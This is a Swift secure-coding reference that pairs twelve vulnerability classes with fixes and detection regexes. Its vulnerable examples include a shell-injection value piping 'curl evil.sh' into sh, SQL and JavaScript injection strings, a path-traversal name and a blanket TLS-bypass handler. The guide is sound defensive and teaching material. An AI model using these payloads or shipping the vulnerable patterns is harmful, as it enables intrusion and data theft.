# Swift Security Features by Version

Modern Swift (5.9 through 6.x) is memory-safe by default, but real-world Swift code — iOS/macOS apps and server-side Swift alike — still reaches into Foundation, CommonCrypto, SQLite, WebKit, and the Security framework, where classic vulnerability classes reappear: object injection through legacy unarchiving, command and SQL injection through string interpolation, TLS bypasses in URLSession delegates, and secrets parked in UserDefaults or source code. This reference documents the highest-signal Swift vulnerability patterns and their secure replacements, for both app and server contexts.

Checkpoint namespace: `SA-SWIFT-NN`. Related mobile-platform checkpoints live in `ios-sdk-security.md` (`SA-IOS-NN`); this file covers the Swift language and its standard APIs.

## Core Swift Security Patterns

### 1. Insecure Deserialization via NSKeyedUnarchiver (CWE-502) — SA-SWIFT-01

The legacy `NSKeyedUnarchiver.unarchiveObject(with:)` and `unarchiveTopLevelObjectWithData(_:)` APIs instantiate whatever class the archive names. An attacker who can tamper with the archived data (a file on disk, a pasteboard payload, data received over the network) can trigger object injection and, chained with available gadget classes, code execution.

```swift
// VULNERABLE: legacy unarchiving instantiates attacker-chosen classes
func restoreSession(from file: URL) -> UserSession? {
    guard let data = try? Data(contentsOf: file) else { return nil }
    let restored = NSKeyedUnarchiver.unarchiveObject(with: data)
    return restored as? UserSession
}

func restorePreferences(_ data: Data) -> Any? {
    return try? NSKeyedUnarchiver.unarchiveTopLevelObjectWithData(data)
}

// SECURE: secure coding restricts decoding to an explicit class allowlist
final class UserSession: NSObject, NSSecureCoding {
    static var supportsSecureCoding: Bool { true }
    // init(coder:) / encode(with:) elided
}

func restoreSessionSecurely(from file: URL) -> UserSession? {
    guard let data = try? Data(contentsOf: file) else { return nil }
    return try? NSKeyedUnarchiver.unarchivedObject(ofClass: UserSession.self, from: data)
}
```

**Security implication:** Legacy unarchiving is the canonical Apple-platform deserialization vulnerability (CWE-502). `unarchivedObject(ofClass:from:)` enforces `NSSecureCoding` and refuses to decode any class outside the allowlist, eliminating the gadget-chain attack surface. Prefer `Codable` with JSON/plist encoders for new persistence formats.

**Detection regex:** `NSKeyedUnarchiver\.unarchive(Object|TopLevelObjectWithData)\s*\(`

### 2. Command Injection via Process + /bin/sh -c (CWE-78) — SA-SWIFT-02

`Process` (formerly `NSTask`) executes external binaries. Launching a shell with `-c` and an interpolated string reintroduces shell metacharacter injection: `;`, `|`, `$()`, and backticks in user input all execute.

```swift
// VULNERABLE: shell -c with interpolated user input executes arbitrary commands
func generateThumbnail(for uploadedName: String) throws {
    let task = Process()
    task.launchPath = "/bin/sh"
    task.arguments = ["-c", "convert /uploads/\(uploadedName) -resize 128x128 /thumbs/\(uploadedName)"]
    try task.run()
}
// uploadedName = "x.png; curl evil.sh | sh" runs the attacker's pipeline

// SECURE: exec the target binary directly; arguments are passed as argv,
// never parsed by a shell, so metacharacters are inert
func generateThumbnailSecurely(for uploadedName: String) throws {
    let safeName = (uploadedName as NSString).lastPathComponent
    let task = Process()
    task.executableURL = URL(fileURLWithPath: "/usr/local/bin/convert")
    task.arguments = ["/uploads/" + safeName, "-resize", "128x128", "/thumbs/" + safeName]
    try task.run()
    task.waitUntilExit()
}
```

**Security implication:** Command injection (CWE-78) gives an attacker code execution with the app or server process's privileges. There is no safe way to interpolate untrusted input into a `sh -c` string; the fix is structural — exec the target binary with an argument array. On server-side Swift this is a remote-code-execution class bug.

**Detection regex:** `launchPath\s*=\s*"/bin/(sh|bash|zsh)"|executableURL\s*=\s*URL\(fileURLWithPath:\s*"/bin/(sh|bash|zsh)"`

### 3. SQL Injection via String Interpolation (CWE-89) — SA-SWIFT-03

Swift string interpolation (`\(value)`) inside SQL text passed to `sqlite3_exec`/`sqlite3_prepare_v2` (or any raw SQL API) is textbook SQL injection.

```swift
// VULNERABLE: user-controlled value interpolated into SQL text
func findUser(byEmail email: String) -> Bool {
    let query = "SELECT id, name FROM users WHERE email = '\(email)'"
    var stmt: OpaquePointer?
    if sqlite3_prepare_v2(db, query, -1, &stmt, nil) == SQLITE_OK {
        defer { sqlite3_finalize(stmt) }
        return sqlite3_step(stmt) == SQLITE_ROW
    }
    return false
}
// email = "x' OR '1'='1" returns every row; stacked queries via sqlite3_exec are worse

// SECURE: ? placeholders with sqlite3_bind_* keep data out of the SQL grammar
// (the C macro SQLITE_TRANSIENT is not imported into Swift; recreate it)
let SQLITE_TRANSIENT = unsafeBitCast(-1, to: sqlite3_destructor_type.self)

func findUserSecurely(byEmail email: String) -> Bool {
    let query = "SELECT id, name FROM users WHERE email = ?"
    var stmt: OpaquePointer?
    guard sqlite3_prepare_v2(db, query, -1, &stmt, nil) == SQLITE_OK else { return false }
    defer { sqlite3_finalize(stmt) }
    sqlite3_bind_text(stmt, 1, email, -1, SQLITE_TRANSIENT)
    return sqlite3_step(stmt) == SQLITE_ROW
}
```

**Security implication:** SQL injection (CWE-89) leads to authentication bypass, data exfiltration, and data destruction. Parameter binding (`?` + `sqlite3_bind_text/int/blob`) is the only reliable fix; escaping is error-prone. Higher-level layers (GRDB, SQLite.swift, Fluent) parameterize by default — use them.

**Detection regex:** `"(SELECT|DELETE)\s[^"]*FROM\s[^"]*[\\][(]|"INSERT\s+INTO\s[^"]*[\\][(]|"UPDATE\s[^"]*SET\s[^"]*[\\][(]|"SELECT\s[^"]*[\\][(][^"]*\sFROM\s` — requiring a second SQL keyword (FROM/INTO/SET) avoids flagging log strings such as `"UPDATE available: \(version)"`. The interpolation marker `\(` is written `[\\][(]` because `\\\(` is rejected by some `grep -E` builds.

### 4. Predictable Randomness for Security Values (CWE-338) — SA-SWIFT-04

`drand48()`, `srand48()`, and C `random()` are deterministic PRNGs. Seeded from the clock (or not reseeded at all), their output is predictable, so tokens, session IDs, nonces, and password-reset codes built from them can be reproduced by an attacker.

```swift
// VULNERABLE: time-seeded LCG output is fully predictable
func makeResetToken() -> String {
    srand48(Int(Date().timeIntervalSince1970))
    var token = ""
    for _ in 0..<16 {
        token += String(Int(drand48() * 16), radix: 16)
    }
    return token
}

// SECURE: CSPRNG via the Security framework
func makeResetTokenSecurely() -> String? {
    var bytes = [UInt8](repeating: 0, count: 32)
    guard SecRandomCopyBytes(kSecRandomDefault, bytes.count, &bytes) == errSecSuccess else {
        return nil
    }
    return bytes.map { String(format: "%02x", $0) }.joined()
}

// SECURE: Swift's default generator is cryptographically secure on Apple
// platforms and Linux (SystemRandomNumberGenerator)
func makeNonce() -> UInt64 {
    var generator = SystemRandomNumberGenerator()
    return UInt64.random(in: UInt64.min...UInt64.max, using: &generator)
}
```

**Security implication:** Predictable randomness (CWE-338) lets attackers forge session tokens and reset codes — full account takeover with no other bug required. Use `SecRandomCopyBytes` or Swift's `SystemRandomNumberGenerator` (the default for `Int.random(in:)` etc.), which draw from the OS CSPRNG.

**Detection regex:** `\b(drand48|srand48)\s*\(|(^|[^.A-Za-z0-9_])(rand|random)\s*\(\s*\)` — the guard before `rand`/`random` skips the secure Swift stdlib calls (`Bool.random()`, `Int.random(in:)`) and `arc4random()`, and only flags the C library free functions.

### 5. App Transport Security Disabled — NSAllowsArbitraryLoads (CWE-319) — SA-SWIFT-05

`NSAllowsArbitraryLoads=true` in `Info.plist` disables App Transport Security for the whole app: plain HTTP, weak TLS versions, and invalid certificates are all accepted again.

```xml
<!-- VULNERABLE: blanket ATS opt-out — every connection may be cleartext -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <true/>
</dict>

<!-- SECURE: ATS stays on; a single legacy host gets a scoped exception -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
    <key>NSExceptionDomains</key>
    <dict>
        <key>legacy.example.com</key>
        <dict>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.2</string>
        </dict>
    </dict>
</dict>
```

**Security implication:** Cleartext transport (CWE-319) exposes credentials and session tokens to any on-path attacker (public Wi-Fi, compromised routers). App Review also rejects unjustified blanket opt-outs. Scope exceptions per-domain with `NSExceptionDomains`, and never combine an exception with `NSExceptionAllowsInsecureHTTPLoads=true` unless the host genuinely cannot serve TLS.

**Detection regex:** `NSAllowsArbitraryLoads</key>\s*<true` (target: `**/Info.plist`). Anchoring on `</key>` restricts the match to the blanket key: the scoped variants (`NSAllowsArbitraryLoadsInWebContent`, `NSAllowsArbitraryLoadsForMedia`) and per-domain `NSExceptionAllowsInsecureHTTPLoads` exceptions are deliberate, reviewable configurations and are left to manual audit to avoid false positives.

### 6. TLS Bypass via Blanket URLCredential(trust:) (CWE-295) — SA-SWIFT-06

Returning `URLCredential(trust: challenge.protectionSpace.serverTrust)` from a URLSession authentication-challenge handler without evaluating the trust object accepts *any* certificate — self-signed, expired, or attacker-issued.

```swift
// VULNERABLE: every server certificate is accepted — MITM trivially succeeds
func urlSession(_ session: URLSession, didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
    completionHandler(.useCredential, URLCredential(trust: challenge.protectionSpace.serverTrust!))
}

// SECURE: evaluate the trust chain before creating a credential
func urlSession(_ session: URLSession, didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
    guard challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust,
          let serverTrust = challenge.protectionSpace.serverTrust else {
        completionHandler(.performDefaultHandling, nil)
        return
    }
    var error: CFError?
    if SecTrustEvaluateWithError(serverTrust, &error) {
        completionHandler(.useCredential, URLCredential(trust: serverTrust))
    } else {
        completionHandler(.cancelAuthenticationChallenge, nil)
    }
}
```

**Security implication:** Improper certificate validation (CWE-295) silently defeats TLS: an on-path attacker presents any certificate and reads/modifies all traffic, including credentials. These handlers are usually added "temporarily" for a dev server and shipped to production. If the delegate method does nothing custom, delete it — the system default validates correctly. For high-value endpoints, add pinning on top (compare `SecTrustCopyKey` against a pinned SPKI hash).

**Detection regex:** `URLCredential\(trust:\s*challenge\.protectionSpace\.serverTrust`

### 7. Broken Hash Algorithms — Insecure.MD5 / Insecure.SHA1 / CC_MD5 (CWE-327, CWE-916) — SA-SWIFT-07

CryptoKit deliberately namespaces MD5 and SHA-1 under `Insecure.`. Both are collision-broken; neither is acceptable for signatures, integrity of untrusted data, or (especially) password storage — fast hashes of any kind are wrong for passwords.

```swift
// VULNERABLE: MD5 for password storage — GPU rigs test billions of guesses/sec
import CryptoKit
func hashPassword(_ password: String) -> String {
    let digest = Insecure.MD5.hash(data: Data(password.utf8))
    return digest.map { String(format: "%02x", $0) }.joined()
}

// VULNERABLE: CommonCrypto legacy digest
var digest = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))
CC_MD5(data, CC_LONG(data.count), &digest)

// SECURE: SHA-256 for integrity of trusted data
func checksum(of data: Data) -> String {
    SHA256.hash(data: data).map { String(format: "%02x", $0) }.joined()
}

// SECURE: a slow, salted KDF for passwords (PBKDF2 via CommonCrypto;
// prefer scrypt/Argon2 from a vetted package where available)
func deriveKey(password: String, salt: Data) -> Data {
    var derived = Data(count: 32)
    derived.withUnsafeMutableBytes { out in
        salt.withUnsafeBytes { saltBytes in
            _ = CCKeyDerivationPBKDF(
                CCPBKDFAlgorithm(kCCPBKDF2), password, password.utf8.count,
                saltBytes.bindMemory(to: UInt8.self).baseAddress, salt.count,
                CCPseudoRandomAlgorithm(kCCPRFHmacAlgSHA256), 600_000,
                out.bindMemory(to: UInt8.self).baseAddress, 32)
        }
    }
    return derived
}
```

**Security implication:** MD5/SHA-1 (CWE-327) allow collision and, for passwords, brute-force attacks (CWE-916). Use `SHA256`/`SHA512` for integrity, `HMAC<SHA256>` for authentication, and a purpose-built KDF (Argon2id, scrypt, or PBKDF2 with a high iteration count and per-user salt) for passwords.

**Detection regex:** `Insecure\.(MD5|SHA1)|CC_MD5\s*\(|CC_SHA1\s*\(`

### 8. Hardcoded Secrets in Source (CWE-798) — SA-SWIFT-08

API keys, passwords, and tokens assigned as string literals in `let`/`var` declarations ship inside the binary (trivially extracted with `strings`) and live forever in git history.

```swift
// VULNERABLE: credentials compiled into the binary and committed to git
struct APIConfig {
    static let apiKey = "sk_live_9a8b7c6d5e4f3a2b1c0d"
    static let dbPassword = "Sup3rSecretProd!"
}

// SECURE: resolve secrets at runtime from the environment (server) or
// Keychain / remote config (app); fail fast if absent
struct SecureAPIConfig {
    static var apiKey: String {
        guard let value = ProcessInfo.processInfo.environment["SERVICE_API_KEY"] else {
            fatalError("SERVICE_API_KEY is not configured")
        }
        return value
    }
}
```

**Security implication:** Hardcoded credentials (CWE-798) cannot be rotated without shipping a new build, are exposed to anyone with the binary or repo access, and are a top real-world breach cause. On servers, inject via environment/secret manager; in apps, fetch per-user tokens after authentication and store them in the Keychain — a key that must not be extractable can never ship client-side at all.

**Detection regex:** `\b(let|var)\s+\w*([pP]assword|[sS]ecret|[aA]pi[Kk]ey|[tT]oken)(\s*:\s*String)?\s*=\s*"[^"]{8,}"` — the name must *end* with the sensitive word, so benign declarations like `let tokenEndpoint = "https://..."` or `let passwordPlaceholder = "Enter your password"` are not flagged.

### 9. Secrets in UserDefaults (CWE-922) — SA-SWIFT-09

`UserDefaults` writes an unencrypted plist inside the app container. It is captured in backups, readable on jailbroken devices, and shared with any code in the app group — never a place for passwords, tokens, or API keys.

```swift
// VULNERABLE: bearer tokens persisted to a plaintext plist
func persistSession(_ session: Session) {
    UserDefaults.standard.set(session.authToken, forKey: "authToken")
    UserDefaults.standard.set(session.refreshToken, forKey: "refreshToken")
}

// SECURE: secrets go to the Keychain; UserDefaults keeps only benign flags
func persistSessionSecurely(_ session: Session) {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrService as String: "com.example.app.session",
        kSecAttrAccount as String: "primary",
        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
        kSecValueData as String: Data(session.authToken.utf8)
    ]
    SecItemDelete(query as CFDictionary)
    SecItemAdd(query as CFDictionary, nil)
    UserDefaults.standard.set(true, forKey: "hasActiveSession")
}
```

**Security implication:** Insecure storage of sensitive data (CWE-922) is among the most common mobile findings (OWASP MASVS-STORAGE). The Keychain provides hardware-backed encryption at rest, access control via accessibility classes, and exclusion from backups with `ThisDeviceOnly` variants.

**Detection regex:** `UserDefaults\.standard\.set\([^,)]*([pP]assword|[tT]oken|[aA]pi[Kk]ey|[sS]ecret)[^A-Za-z0-9_]` — the sensitive word must appear in the *value* argument (before the first comma) and must *end* the identifier, so boolean preferences such as `set(true, forKey: "passwordAutofillEnabled")` and non-secret values like `set(isPasswordSet, ...)` or `set(tokenRefreshInterval, ...)` are not flagged.

### 10. JavaScript Injection in WKWebView — evaluateJavaScript with Interpolation (CWE-79, CWE-94) — SA-SWIFT-10

Interpolating native strings into `evaluateJavaScript` source builds JavaScript by concatenation. Untrusted input (a display name, a search query, remote content) breaks out of the string literal and executes in the web view's origin.

```swift
// VULNERABLE: name = "'); stealCookies(); ('" executes attacker JS
func showGreeting(name: String) {
    webView.evaluateJavaScript("displayGreeting('\(name)')")
}

// SECURE: callAsyncJavaScript passes values as real function arguments —
// they are serialized, never parsed as source
func showGreetingSecurely(name: String) async throws {
    try await webView.callAsyncJavaScript(
        "displayGreeting(userName)",
        arguments: ["userName": name],
        in: nil,
        contentWorld: .page
    )
}
```

**Security implication:** Injected JavaScript runs with the page's privileges: it can read the DOM, session cookies, and any `WKScriptMessageHandler` bridge — often escalating to native-side actions. `callAsyncJavaScript(_:arguments:in:contentWorld:)` (iOS 14+/macOS 11+) is the structural fix, analogous to parameterized SQL. If you must target older OS versions, JSON-encode values and pass them through `JSON.parse`.

**Detection regex:** `evaluateJavaScript\s*\(\s*"[^"]*[\\][(]`

### 11. Weak Keychain Accessibility — kSecAttrAccessibleAlways (CWE-922) — SA-SWIFT-11

`kSecAttrAccessibleAlways` (and its `ThisDeviceOnly` variant) makes a Keychain item readable even while the device is locked, discarding the passcode-derived encryption tier. It has been deprecated since iOS 12 for exactly this reason.

```swift
// VULNERABLE: item is decryptable whenever the device is powered on
let attributes: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "refreshToken",
    kSecAttrAccessible as String: kSecAttrAccessibleAlways,
    kSecValueData as String: tokenData
]
SecItemAdd(attributes as CFDictionary, nil)

// SECURE: unlocked-only, this-device-only — strongest general-purpose class
let secureAttributes: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "refreshToken",
    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
    kSecValueData as String: tokenData
]
SecItemAdd(secureAttributes as CFDictionary, nil)
```

**Security implication:** With `Always` accessibility, a stolen, locked device (or a forensic acquisition of it) yields the secret. `WhenUnlockedThisDeviceOnly` keeps the item bound to this device's hardware keys, excluded from backups, and encrypted whenever the screen is locked. Items that background daemons need can use `AfterFirstUnlockThisDeviceOnly` — still far stronger than `Always`.

**Detection regex:** `kSecAttrAccessibleAlways`

### 12. Path Traversal via Interpolated File Paths (CWE-22) — SA-SWIFT-12

Building `FileManager`/`URL` paths by interpolating user-supplied names lets `../` sequences escape the intended directory and read or overwrite arbitrary files in the sandbox (or, server-side, on the host).

```swift
// VULNERABLE: fileName = "../../Preferences/com.example.app.plist" escapes
// the attachments directory
func readAttachment(named fileName: String) -> Data? {
    let docs = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true)[0]
    return FileManager.default.contents(atPath: "\(docs)/attachments/\(fileName)")
}

// SECURE: strip path components, resolve, and verify the canonical prefix
func readAttachmentSecurely(named fileName: String) -> Data? {
    let docs = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true)[0]
    let base = URL(fileURLWithPath: docs).appendingPathComponent("attachments", isDirectory: true)
    let safeName = (fileName as NSString).lastPathComponent
    let candidate = base.appendingPathComponent(safeName).standardizedFileURL
    guard candidate.path.hasPrefix(base.path + "/") else { return nil }
    return FileManager.default.contents(atPath: candidate.path)
}
```

**Security implication:** Path traversal (CWE-22) in apps leaks Keychain-adjacent container files, databases, and cookies; on server-side Swift (e.g. a Vapor file endpoint) it reads `/etc/passwd`-class host files. Defense in depth: take only `lastPathComponent`, standardize the URL, and verify the result still lives under the intended base directory.

**Detection regex:** `(fileURLWithPath|atPath|contentsOfFile):\s*"[^"]*[\\][(]|(fileURLWithPath|atPath|contentsOfFile):\s*[A-Za-z_][A-Za-z0-9_.]*\s*\+\s*("[^"]*"\s*\+\s*)*[A-Za-z_]` — the concatenation branch only fires when the chain ends in a variable, so appending a constant literal (`atPath: cacheDir + "/settings.plist"`) is not flagged.

## Swift 6 Notes

- **Strict concurrency (Swift 6 language mode):** data races become compile-time errors. Races are a security class (TOCTOU on auth state, torn reads of security flags), so adopting `-strict-concurrency=complete` is a hardening step, not just hygiene.
- **Typed throws and `~Copyable`:** enable APIs that make single-use tokens and non-duplicable capabilities expressible in the type system.
- **`SystemRandomNumberGenerator`** remains the default RNG for the standard library's `random(in:)` APIs and is cryptographically secure on Apple platforms (`arc4random_buf`) and Linux (`getrandom`) — the insecure patterns in this file come from reaching down to C (`drand48`, `random`) instead.
- **Foundation on Linux (server-side Swift):** the Security framework (`SecRandomCopyBytes`, `SecTrust*`, Keychain) is Apple-only. On Linux use `Crypto` (swift-crypto) equivalents and platform secret stores; the vulnerability patterns for interpolation-based injection (sections 2, 3, 10, 12) apply unchanged.

## Detection Patterns for Auditing Swift

| Pattern | Regex | Severity | Checkpoint ID |
|---------|-------|----------|---------------|
| Legacy NSKeyedUnarchiver deserialization | `NSKeyedUnarchiver\.unarchive(Object\|TopLevelObjectWithData)\s*\(` | error | SA-SWIFT-01 |
| Process launches a shell | `launchPath\s*=\s*"/bin/(sh\|bash\|zsh)"\|executableURL\s*=\s*URL\(fileURLWithPath:\s*"/bin/(sh\|bash\|zsh)"` | error | SA-SWIFT-02 |
| SQL built with interpolation | `"(SELECT\|DELETE)\s[^"]*FROM\s[^"]*[\\][(]\|"INSERT\s+INTO\s[^"]*[\\][(]\|"UPDATE\s[^"]*SET\s[^"]*[\\][(]\|"SELECT\s[^"]*[\\][(][^"]*\sFROM\s` | error | SA-SWIFT-03 |
| Predictable PRNG (drand48/random/rand) | `\b(drand48\|srand48)\s*\(\|(^\|[^.A-Za-z0-9_])(rand\|random)\s*\(\s*\)` | warning | SA-SWIFT-04 |
| ATS disabled in Info.plist | `NSAllowsArbitraryLoads</key>\s*<true` | error | SA-SWIFT-05 |
| Blanket URLCredential(trust:) | `URLCredential\(trust:\s*challenge\.protectionSpace\.serverTrust` | error | SA-SWIFT-06 |
| MD5/SHA-1 digests | `Insecure\.(MD5\|SHA1)\|CC_MD5\s*\(\|CC_SHA1\s*\(` | warning | SA-SWIFT-07 |
| Hardcoded secret literal | `\b(let\|var)\s+\w*([pP]assword\|[sS]ecret\|[aA]pi[Kk]ey\|[tT]oken)(\s*:\s*String)?\s*=\s*"[^"]{8,}"` | error | SA-SWIFT-08 |
| Secrets in UserDefaults | `UserDefaults\.standard\.set\([^,)]*([pP]assword\|[tT]oken\|[aA]pi[Kk]ey\|[sS]ecret)[^A-Za-z0-9_]` | error | SA-SWIFT-09 |
| WKWebView JS interpolation | `evaluateJavaScript\s*\(\s*"[^"]*[\\][(]` | error | SA-SWIFT-10 |
| Keychain Always accessibility | `kSecAttrAccessibleAlways` | error | SA-SWIFT-11 |
| Concatenated/interpolated file paths | `(fileURLWithPath\|atPath\|contentsOfFile):\s*"[^"]*[\\][(]\|(fileURLWithPath\|atPath\|contentsOfFile):\s*[A-Za-z_][A-Za-z0-9_.]*\s*\+\s*("[^"]*"\s*\+\s*)*[A-Za-z_]` | error | SA-SWIFT-12 |

## Version Adoption Security Checklist

- [ ] Replace every `NSKeyedUnarchiver.unarchiveObject`/`unarchiveTopLevelObjectWithData` call with `unarchivedObject(ofClass:from:)`, and migrate persistence to `Codable` where practical
- [ ] Audit all `Process`/`NSTask` usage: no `/bin/sh -c`, arguments passed as argv arrays
- [ ] Parameterize all raw SQL (`?` + `sqlite3_bind_*`) or move to GRDB/SQLite.swift/Fluent
- [ ] Replace `drand48`/`srand48`/`random()` in security paths with `SecRandomCopyBytes` or `SystemRandomNumberGenerator`
- [ ] Remove `NSAllowsArbitraryLoads=true`; scope any remaining ATS exceptions per-domain
- [ ] Delete or fix custom `urlSession(_:didReceive:completionHandler:)` trust handlers; run `SecTrustEvaluateWithError` before trusting
- [ ] Ban `Insecure.MD5`/`Insecure.SHA1`/`CC_MD5`/`CC_SHA1`; hash passwords with a KDF
- [ ] Sweep for hardcoded secrets (`let apiKey = "..."`) and move them to env/Keychain/secret manager
- [ ] Move all tokens/passwords out of `UserDefaults` into the Keychain with `ThisDeviceOnly` accessibility
- [ ] Replace `evaluateJavaScript` string-building with `callAsyncJavaScript(arguments:)`
- [ ] Replace `kSecAttrAccessibleAlways` with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`
- [ ] Canonicalize and prefix-check every file path assembled from external input
- [ ] Enable Swift 6 strict concurrency (`-strict-concurrency=complete`) to surface data races

## Related References

- `ios-sdk-security.md` — iOS platform checkpoints (SA-IOS): pasteboard, UIWebView, pbxproj hardening
- `owasp-top10.md` — OWASP Top 10 mapping
- `cwe-top25.md` — CWE Top 25 mapping
- `input-validation.md` — Input validation patterns
- `api-key-encryption.md` — Secure API key storage and encryption
- `deserialization-prevention.md` — Safe deserialization patterns
- `path-traversal-prevention.md` — Path traversal defenses

## Changelog

| Date | Change | Reason |
|------|--------|--------|
| 2026-07-20 | Initial release | Coverage expansion |
